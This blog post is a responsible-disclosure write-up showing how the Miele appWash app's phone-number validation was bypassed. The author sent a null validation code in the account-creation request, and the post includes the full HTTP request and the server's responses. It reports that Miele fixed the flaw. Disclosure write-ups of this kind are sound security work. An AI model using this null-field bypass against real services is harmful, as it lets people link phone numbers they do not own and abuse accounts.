---
layout: post
title:  "Write-up Miele appWash"
categories: security android
permalink: "/appwash-writeup/"
---
Bypassing number validation and completing my first responsible disclosure.

# Background
When entering the wrong number validation code in an app used to pay for laundry, I saw some weird behavior.
As expected it gave an error about the code not matching but it sent the same code again and let me enter the rest of the registration information.
When submitting the information I got the error again but no new SMS.
This prompted me to look into the internet traffic and I found some interesting things.

When I contacted Miele's incident response team they got back to me the following morning and resolved the issue within two weeks!
I have also been added to their [hall of thanks](https://www.miele.com/en/com/cybersecurity-5047.htm#p5052) which is nice.

# Summary  
The number validation can be bypassed without use of the validation code.  
By bypassing the validation someone could link any phone number to their account.

Note:  
The validation code does not seem to expire after wrong attempts so a brute-force attack might also be possible.

# Proof of Concept  
> This doesn't work anymore of course  

For this proof of Concept I used a secondary phone number, and the verification code was: `24062`, but knowing the code is not necessary.

The app submits the data with the following POST request:  
In the request I replaced `"validationCode":"12345"` with `"validationCode":null`

``` c
POST /api-rest/account HTTP/1.1
language: en
platform: appwash
Content-Type: application/json
Content-Length: 686
Host: www.involtum-services.com
Connection: close

{"salutations":"m",
"businessName":null,
"firstName":"X",
"lastName":"X",
"email":"placeholder@email.com",
"street":"X",
"zip":"X",
"city":"X",
"country":"BE",
"invoice_street":null,
"invoice_street2":null,
"invoice_zip":null,
"emailNotification":true,
"invoice_city":null,
"invoice_country":null,
"invoice_language":"en",
"language":"en","iban":"",
"bic":"",
"chamberOfCommerce":null,
"automatic_collection":false,
"account_prepaid":true,
"userName":"placeholder@email.com",
"validationCode":null,
"password":"password",
"mobile":[{
          "mobile":"+31622425986",
          "notification":false,
          "locked":false
         }],
"pushNotification":true,
"locationExternalId":null,
"tcAcceptedAnswer":"ACCEPTED",
"tcVersion":"1",
"currency":"EUR"}
```

# Observed Result  
The Account is created successfully and the server reacted with this result:

``` c
HTTP/1.1 200 OK
Date: Wed, 22 Jul 2020 17:41:31 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
Strict-Transport-Security: max-age=63072000; includeSubDomains
X-Frame-Options: sameorigin
Content-Type: application/json
Cache-Control: no-cache, no-store, no-transform, must-revalidate, max-age=0
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: origin,content-type,accept,authorization,filter,language,platform,token
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS,HEAD
Access-Control-Max-Age: 29030400
Content-Length: 430
Connection: close

{
  "errorCode":0,
  "errorDescription":"",
  "token_expire_ts":0,
  "serverTime":1595439691,
  "errorDetailMessage":"",
  "activeSessions":[],
  "login":{"email":"placeholder@email.com",
           "password":null,
           "username":"placeholder@email.com",
           "externalId":"73252001",
           "language":"EN",
           "token":"2ea4ddd8:17352a3ed54:-6d70",
           "offlineAllowed":true,
           "manageOthers":true,
           "startMultiple":true,
           "startForOthers":false,
           "fcmToken":null,
           "appOS":null,
           "appVersion":null
         }
}
```
I could also successfully log into the app! (This is a number I only use for testing)
![image could not be loaded](/assets/appwash_screenshot.webp){: style="padding:16px"}

# Expected Result  
A server response like the one when you enter a wrong validation code, or another error.

``` c
HTTP/1.1 200 OK
Date: Wed, 22 Jul 2020 17:26:54 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
Strict-Transport-Security: max-age=63072000; includeSubDomains
X-Frame-Options: sameorigin
Content-Type: application/json
Cache-Control: no-cache, no-store, no-transform, must-revalidate, max-age=0
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: origin,content-type,accept,authorization,filter,language,platform,token
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS,HEAD
Access-Control-Max-Age: 29030400
Content-Length: 235
Connection: close

{
  "errorCode":41,
  "errorDescription":"This validation code doesn't seem to be correct. Please check the validation code. (code 41)",
  "token_expire_ts":0,
  "serverTime":1595438814,
  "errorDetailMessage":null,
  "activeSessions":null,
  "login":null
}

```

# Possible mitigation
I suspect implementing server-side type checking would resolve this particular issue.   
However, this would not help against a possible brute-force attack.
